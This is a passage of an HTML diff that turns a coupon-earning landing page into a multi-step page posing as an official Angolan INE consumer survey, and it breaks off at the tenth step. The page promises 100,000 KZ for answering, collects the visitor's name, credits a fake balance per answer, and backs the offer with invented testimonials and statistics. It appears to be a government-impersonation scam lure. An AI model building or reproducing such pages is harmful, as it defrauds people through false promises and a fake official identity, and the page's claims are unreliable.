@@ -1,240 +1,893 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <link rel="icon" type="image/svg+xml" href="/vite.svg">
-    <meta name="generator" content="Hostinger Horizons">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cupom da Vez - Ganhe Dinheiro com Cupons</title>
-
-    <link rel="stylesheet" href="index-9d423ca4.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" data-react-helmet="true">
-    <meta name="theme-color" content="#ffd700" data-react-helmet="true">
-</head>
-
 <body>
-    <div id="root">
-        <div class="mobile-container">
-            <div class="bg-white flex flex-col">
 
-                <div class="flex justify-between items-center p-4 bg-white shadow-sm"
-                    style="opacity: 1; transform: none; justify-content: space-between;">
-                    <div class="flex items-center">
-                        <h1 class="text-2xl font-black text-black">cupom</h1>
-                        <div class="w-6 h-6 bg-yellow-400 rounded-full flex items-center justify-center ml-1">
-                            <span class="text-black font-bold text-xs">$</span>
-                        </div>
-                        <div class="ml-1">
-                            <span class="text-xs font-medium text-gray-600 block leading-tight">DA VEZ</span>
+    <header>
+        <img src="images/Logo_INE.svg" alt="Logo INE" class="logo">
+        <div class="user-status" id="userHeader" style="display: none;">
+            <div class="status-item">
+                <span id="headerName">Usuário</span>
+            </div>
+            <div class="status-item">
+                <span>Saldo:</span>
+                <span class="balance-amount" id="headerBalance">0 KZ</span>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="hero-card">
+            <!-- STEP 1: Landing Page -->
+            <div id="step-1">
+                <h1 style="text-transform: uppercase;">
+                    <span style="white-space: nowrap; display: block;">Pesquisa Nacional de</span>
+                    <span style="white-space: nowrap; display: block;">Consumo em Angola – INE</span>
+                </h1>
+
+                <div class="main-image-container">
+                    <img src="images/i.webp" alt="INE Pesquisa Nacional" class="main-image">
+                </div>
+
+                <p class="description">
+                    Responder a um questionário simples sobre hábitos de consumo.
+                </p>
+
+                <button class="cta-button" onclick="showStep2()">PARTICIPAR AGORA</button>
+
+                <div class="social-proof-section">
+                    <h2>Veja o que quem já participou tem a dizer!</h2>
+
+                    <!-- Maria F -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #ef5350;">M</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Maria F</span>
+                                <span class="timestamp">há 2 horas</span>
+                            </div>
+                            <p class="comment-text">“Quero agradecer pela oportunidade 🙏 Respondi o questionário em
+                                poucos
+                                minutos e já recebi os 100.000 KZ. É simples e rápido mesmo. Podem participar sem medo.”
+                            </p>
+                            <div class="comment-actions">
+                                <div class="action-btn">
+                                    <svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 342
+                                </div>
+                                <div class="action-btn">
+                                    <svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg>
+                                </div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
                         </div>
                     </div>
-                    <div class="text-right">
-                        <p class="text-sm text-gray-500">Saldo:</p>
-                        <p class="text-lg font-bold text-green-600 bg-yellow-200 px-3 py-1 rounded-full">Kz&nbsp;0,00
-                        </p>
+
+                    <!-- João K -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #42a5f5;">J</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">João K</span>
+                                <span class="timestamp">há 3 horas</span>
+                            </div>
+                            <p class="comment-text">“Confesso que no início fiquei com dúvidas, mas participei e deu
+                                certo.
+                                Questionário fácil e o dinheiro caiu. Recomendo a todos.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 128</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Ana P -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #ab47bc;">A</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Ana P</span>
+                                <span class="timestamp">há 4 horas</span>
+                            </div>
+                            <p class="comment-text">“Obrigada pela seriedade. Foi tudo muito rápido. Em menos de 10
+                                minutos terminei e já fiz o saque. Vale muito a pena participar.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 895</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Carlos M. -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #66bb6a;">C</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Carlos M.</span>
+                                <span class="timestamp">há 5 horas</span>
+                            </div>
+                            <p class="comment-text">“Participem sem pensar duas vezes. É um estudo simples, perguntas
+                                normais e o pagamento é real. Já levantei os meus 100.000 KZ.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 210</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Helena S. -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #ffa726;">H</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Helena S.</span>
+                                <span class="timestamp">há 6 horas</span>
+                            </div>
+                            <p class="comment-text">“Gostei muito da experiência. Tudo claro, nada complicado. Respondi
+                                pelo
+                                telemóvel e recebi o valor no mesmo dia.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 45</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Paulo T. -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #bdbdbd;">P</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Paulo T.</span>
+                                <span class="timestamp">há 7 horas</span>
+                            </div>
+                            <p class="comment-text">“Recomendo. Questionário rápido, sem stress, e o dinheiro sai
+                                mesmo.
+                                Obrigado pela oportunidade.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 189</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Rosa L. -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #ec407a;">R</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Rosa L.</span>
+                                <span class="timestamp">há 8 horas</span>
+                            </div>
+                            <p class="comment-text">“É verdadeiro sim. Já participei e recebi. Aproveitem enquanto ainda
+                                há
+                                vagas.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 76</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Fernando A. -->
+                    <div class="comment-item">
+                        <div class="avatar" style="background-color: #26a69a;">F</div>
+                        <div class="comment-content">
+                            <div class="comment-header">
+                                <span class="username">Fernando A.</span>
+                                <span class="timestamp">há 1 dia</span>
+                            </div>
+                            <p class="comment-text">“Parabéns pela iniciativa. É bom quando valorizam a nossa opinião.
+                                Fácil, rápido e pagamento garantido.”</p>
+                            <div class="comment-actions">
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z"></path>
+                                    </svg> 512</div>
+                                <div class="action-btn"><svg viewBox="0 0 24 24" class="icon">
+                                        <path d="M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z"></path>
+                                    </svg></div>
+                                <div class="action-btn text">Responder</div>
+                            </div>
+                        </div>
                     </div>
                 </div>
-                <main class="flex flex-col items-center p-3 pt-2 text-center">
 
-                    <div class="w-full max-w-2xl aspect-video rounded-2xl overflow-hidden shadow-xl mb-3">
+                <button class="cta-button" onclick="showStep2()" style="margin-top: 2rem;">PARTICIPAR AGORA</button>
+            </div>
 
+            <!-- STEP 2: Name Input -->
+            <div id="step-2" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 2rem;">Digite o seu nome abaixo para participar
+                    do estudo e ganhar 100.000 KZ!</h2>
+                <input type="text" placeholder="Nome" class="name-input">
+                <button class="cta-button" onclick="showStep3()">CONTINUAR</button>
+            </div>
 
-                        <div class="video-wrapper">
-                           <iframe id="pandaVideo"
-                                src="https://player-vz-15e60977-40e.tv.pandavideo.com/embed/?v=fbc61670-0f74-45bd-bf49-da3692dd7cdb&autoplay=1&muted=1"
-                                allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen
-                                fetchpriority="high">
-                            </iframe>
+            <!-- STEP 3: Info Page -->
+            <div id="step-3" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <p class="info-text">
+                    O INE está a realizar uma pesquisa nacional para descobrir quais são as empresas e marcas mais
+                    consumidas em Angola e esta a pagar 100.000kz para quem participar.
+                </p>
+                <button class="cta-button" onclick="showStep4()">PARTICIPAR</button>
 
+                <!-- Statistics Section -->
+                <div class="stats-container">
+                    <h3>Resultados do Estudo de 2025</h3>
 
-
-
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">1.</span>
+                            <span class="stat-label">Melhor banco em Angola (2025):</span>
                         </div>
-                        <style>
-                            .video-wrapper {
-                                margin-top: -8px;
-
-                            }
-                        </style>
-
-
-                        <style>
-                            .video-wrapper {
-                                position: relative;
-                                width: 100%;
-                                padding-top: 56.25%;
-                                border-radius: 18px;
-                                overflow: hidden;
-                            }
-
-                            .video-wrapper iframe {
-                                position: absolute;
-                                inset: 0;
-                                width: 100%;
-                                height: 100%;
-                                border: none;
-                            }
-
-                            /* Overlay */
-                            #overlayPlay {
-                                position: absolute;
-                                inset: 0;
-                                background: linear-gradient(to bottom,
-                                        rgba(0, 0, 0, 0.45),
-                                        rgba(0, 0, 0, 0.65));
-                                display: flex;
-                                flex-direction: column;
-                                justify-content: center;
-                                align-items: center;
-                                cursor: pointer;
-                                z-index: 5;
-                                color: #fff;
-                                text-align: center;
-                                animation: fadeIn 0.6s ease;
-                            }
-
-                            #overlayPlay p {
-                                margin-top: 14px;
-                                font-size: 16px;
-                                font-weight: 600;
-                                opacity: 0.95;
-                            }
-
-                            /* Botão play */
-                            .pulse-circle {
-                                width: 90px;
-                                height: 90px;
-                                border-radius: 50%;
-                                background: rgba(255, 215, 0, 0.95);
-                                display: flex;
-                                align-items: center;
-                                justify-content: center;
-                                animation: pulse 1.8s infinite;
-                                box-shadow: 0 0 0 rgba(255, 215, 0, 0.6);
-                            }
-
-                            .play-icon {
-                                font-size: 34px;
-                                color: #000;
-                                margin-left: 4px;
-                            }
-
-                            /* Animações */
-                            @keyframes pulse {
-                                0% {
-                                    box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.6);
-                                }
-
-                                70% {
-                                    box-shadow: 0 0 0 25px rgba(255, 215, 0, 0);
-                                }
-
-                                100% {
-                                    box-shadow: 0 0 0 0 rgba(255, 215, 0, 0);
-                                }
-                            }
-
-                            @keyframes fadeIn {
-                                from {
-                                    opacity: 0;
-                                }
-
-                                to {
-                                    opacity: 1;
-                                }
-                            }
-
-                            .text-sm {
-                                margin-top: 20px;
-                            }
-                        </style>
-
-
-                        <script>
-                            document.getElementById("overlayPlay").addEventListener("click", () => {
-                                const iframe = document.getElementById("pandaVideo");
-
-                                // Ativa o som
-                                iframe.src = iframe.src.replace("&muted=1", "&muted=0");
-
-                                // Remove overlay
-                                document.getElementById("overlayPlay").remove();
-                            });
-                        </script>
-
+                        <div class="stat-winner">BAI – Banco Angolano de Investimentos</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 45%;">45%</div>
+                        </div>
                     </div>
 
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">2.</span>
+                            <span class="stat-label">Emissora de televisão mais preferida:</span>
+                        </div>
+                        <div class="stat-winner">TV Zimbo</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 60%;">60%</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">3.</span>
+                            <span class="stat-label">Rede de telefonia mais utilizada:</span>
+                        </div>
+                        <div class="stat-winner">Unitel</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 75%;">75%</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">4.</span>
+                            <span class="stat-label">Supermercado mais frequentado:</span>
+                        </div>
+                        <div class="stat-winner">Kero</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 55%;">55%</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">5.</span>
+                            <span class="stat-label">Aplicativo bancário mais preferido:</span>
+                        </div>
+                        <div class="stat-winner">Multicaixa Express</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 80%;">80%</div>
+                        </div>
+                    </div>
+
+                    <div class="stat-item">
+                        <div class="stat-header">
+                            <span class="stat-number">6.</span>
+                            <span class="stat-label">Serviço de internet mais utilizado:</span>
+                        </div>
+                        <div class="stat-winner">Unitel Net Casa</div>
+                        <div class="stat-bar-container">
+                            <div class="stat-bar-fill" style="width: 40%;">40%</div>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <div class="bg-yellow-100 border-l-4 border-yellow-400 text-yellow-800 p-4 rounded-lg flex items-center max-w-2xl w-full mb-6"
-                style="opacity: 1; transform: none;">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
-                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
-                    class="h-6 w-6 mr-3 text-yellow-500">
-                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z">
-                    </path>
-                    <path d="M12 9v4"></path>
-                    <path d="M12 17h.01"></path>
-                </svg>
-                <p class="font-semibold text-center flex-1">Assista esse vídeo até o final para começar a ganhar!</p>
+
+            <!-- STEP 4: Survey Question -->
+            <div id="step-4" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual banco você considera o melhor em
+                    Angola?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">BAI (Banco Angolano de
+                        Investimentos)</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">BFA (Banco de Fomento
+                        Angola)</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">BIC</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">BPC (Banco de Poupança e
+                        Crédito)</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">ATLANTICO</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 5)">Outro</button>
+                </div>
+
+                <!-- Vertical Chart Section -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 45%;"></div>
+                        <div class="v-bar" style="height: 60%;"></div>
+                        <div class="v-bar" style="height: 35%;"></div>
+                        <div class="v-bar" style="height: 50%;"></div>
+                        <div class="v-bar" style="height: 75%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label">BAI</div>
+                        <div class="v-label">BFA</div>
+                        <div class="v-label">BIC</div>
+                        <div class="v-label">BPC</div>
+                        <div class="v-label" style="font-size: 0.7rem;">ATLANTICO</div>
+                    </div>
+                </div>
             </div>
-            <p class="text-gray-500 text-sm mt-auto mb-4" style="margin-top:150px; text-align: center;">© 2026 Todos os
-                direitos
-                reservados - Cupom da Vez</p>
-            </main>
-            <footer class="sticky bottom-0 p-4 bg-white/80 backdrop-blur-sm">
-                <div tabindex="0" style="opacity: 1; transform: none;">
-                    <button onclick="continuar()" class=" inline-flex items-center justify-center ring-offset-background 
-            focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring 
-            focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50
-             h-10 w-full bg-green-500 hover:bg-green-600 text-white font-bold py-6 px-6 rounded-2xl 
-             text-xl shadow-lg transform transition-transform duration-200" id="btnContinuar">
-                        INICIAR AGORA
+
+            <!-- STEP 5: TV Question -->
+            <div id="step-5" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual emissora de televisão você mais
+                    prefere assistir?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 8000, 6)">TPA 1</button>
+                    <button class="survey-btn" onclick="selectOption(this, 8000, 6)">TPA 2</button>
+                    <button class="survey-btn" onclick="selectOption(this, 8000, 6)">ZAP Viva</button>
+                    <button class="survey-btn" onclick="selectOption(this, 8000, 6)">TV Zimbo</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 5 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 55%;"></div>
+                        <div class="v-bar" style="height: 40%;"></div>
+                        <div class="v-bar" style="height: 85%;"></div>
+                        <div class="v-bar" style="height: 65%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label">TPA 1</div>
+                        <div class="v-label">TPA 2</div>
+                        <div class="v-label">ZAP</div>
+                        <div class="v-label">ZIMBO</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 6: Telecom Question -->
+            <div id="step-6" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual rede de telefonia você mais
+                    utiliza?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 7)">Unitel</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 7)">Africell</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 7)">Movicel</button>
+                    <button class="survey-btn" onclick="selectOption(this, 10000, 7)">Angola Telecom</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 6 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 90%;"></div>
+                        <div class="v-bar" style="height: 45%;"></div>
+                        <div class="v-bar" style="height: 30%;"></div>
+                        <div class="v-bar" style="height: 25%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label" style="font-size: 0.6rem;">UNITEL</div>
+                        <div class="v-label" style="font-size: 0.6rem;">AFRICELL</div>
+                        <div class="v-label" style="font-size: 0.6rem;">MOVICEL</div>
+                        <div class="v-label" style="font-size: 0.6rem;">TELECOM</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 7: Banking App Question -->
+            <div id="step-7" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual aplicativo bancário você mais
+                    prefere utilizar?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 12000, 8)">Multicaixa Express</button>
+                    <button class="survey-btn" onclick="selectOption(this, 12000, 8)">BAI Direto</button>
+                    <button class="survey-btn" onclick="selectOption(this, 12000, 8)">Unitel Money</button>
+                    <button class="survey-btn" onclick="selectOption(this, 12000, 8)">PayPay</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 7 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 80%;"></div>
+                        <div class="v-bar" style="height: 60%;"></div>
+                        <div class="v-bar" style="height: 40%;"></div>
+                        <div class="v-bar" style="height: 50%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label" style="font-size: 0.5rem;">MCX</div>
+                        <div class="v-label" style="font-size: 0.6rem;">BAI</div>
+                        <div class="v-label" style="font-size: 0.5rem;">MONEY</div>
+                        <div class="v-label" style="font-size: 0.6rem;">PAYPAY</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 8: Internet Service Question -->
+            <div id="step-8" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Qual serviço de internet você mais
+                    utiliza em casa ou no telemóvel?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 15000, 9)">ZAP Fibra</button>
+                    <button class="survey-btn" onclick="selectOption(this, 15000, 9)">Unitel Net Casa</button>
+                    <button class="survey-btn" onclick="selectOption(this, 15000, 9)">TV Cabo</button>
+                    <button class="survey-btn" onclick="selectOption(this, 15000, 9)">Angola Telecom</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 8 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 75%;"></div>
+                        <div class="v-bar" style="height: 65%;"></div>
+                        <div class="v-bar" style="height: 55%;"></div>
+                        <div class="v-bar" style="height: 35%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label">ZAP</div>
+                        <div class="v-label" style="font-size: 0.6rem;">UNITEL</div>
+                        <div class="v-label">CABO</div>
+                        <div class="v-label" style="font-size: 0.5rem;">TELECOM</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 9: General Evaluation Question -->
+            <div id="step-9" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">De forma geral, como você avalia os
+                    serviços que utiliza em Angola?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 20000, 10)">Muito bons</button>
+                    <button class="survey-btn" onclick="selectOption(this, 20000, 10)">Bons</button>
+                    <button class="survey-btn" onclick="selectOption(this, 20000, 10)">Razoáveis</button>
+                    <button class="survey-btn" onclick="selectOption(this, 20000, 10)">Mal</button>
+                    <button class="survey-btn" onclick="selectOption(this, 20000, 10)">Muito Mal</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 9 -->
+                <div class="vertical-chart-wrapper">
+                    <div class="vertical-bars">
+                        <div class="v-bar" style="height: 30%;"></div>
+                        <div class="v-bar" style="height: 50%;"></div>
+                        <div class="v-bar" style="height: 80%;"></div>
+                        <div class="v-bar" style="height: 40%;"></div>
+                        <div class="v-bar" style="height: 20%;"></div>
+                    </div>
+                    <div class="vertical-labels">
+                        <div class="v-label" style="font-size: 0.6rem;">M.BOM</div>
+                        <div class="v-label" style="font-size: 0.6rem;">BOM</div>
+                        <div class="v-label" style="font-size: 0.6rem;">RAZ.</div>
+                        <div class="v-label" style="font-size: 0.6rem;">MAU</div>
+                        <div class="v-label" style="font-size: 0.6rem;">M.MAU</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 10: Recommendation Question -->
+            <div id="step-10" style="display: none; animation: fadeIn 0.5s ease-out;">
+                <h2 style="color: var(--secondary-color); margin-bottom: 1.5rem;">Você recomendaria essas empresas a
+                    outras
+                    pessoas?</h2>
+                <div class="survey-options">
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 11)">Sim, recomendaria</button>
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 11)">Talvez</button>
+                    <button class="survey-btn" onclick="selectOption(this, 13000, 11)">Não recomendaria</button>
+                </div>
+
+                <!-- Vertical Chart Section Step 10 -->
